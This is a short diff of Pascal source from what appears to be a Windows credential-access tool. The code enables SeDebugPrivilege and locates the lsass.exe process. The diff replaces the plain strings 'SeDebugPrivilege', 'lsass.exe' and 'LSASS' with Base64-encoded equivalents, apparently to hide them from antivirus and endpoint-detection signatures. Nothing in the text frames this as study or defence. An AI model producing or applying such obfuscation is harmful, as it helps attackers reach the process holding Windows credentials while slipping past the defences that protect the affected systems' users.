@@ -1236,8 +1236,8 @@ begin
   osarch:=getenv('PROCESSOR_ARCHITECTURE');
   getmem(sysdir,Max_Path );
   GetSystemDirectory(sysdir, MAX_PATH - 1);
-  debugpriv:=EnableDebugPriv('SeDebugPrivilege');
-  lsass_pid:=upsapi._EnumProc2('lsass.exe');
+  debugpriv:=EnableDebugPriv(DecodeStringBase64('U2VEZWJ1Z1ByaXZpbGVnZQ==')); //SeDebugPrivilege
+  lsass_pid:=upsapi._EnumProc2(DecodeStringBase64 ('bHNhc3MuZXhl')); //lsass.exe
   end;
   //
   //writeln(length(string('test')));
@@ -1254,8 +1254,7 @@ begin
   log('IsAdministratorAccount:'+BoolToStr (IsAdministratorAccount,true),1);
   log('IsElevated:'+BoolToStr (IsElevated,true),1);
   log('DebugPrivilege:'+BoolToStr (debugpriv,true),1);
-  log('LSASS PID:'+inttostr(lsass_pid ),1);
-
+  log(DecodeStringBase64 ('TFNBU1M=')+' PID:'+inttostr(lsass_pid ),1);
   end;
 
 
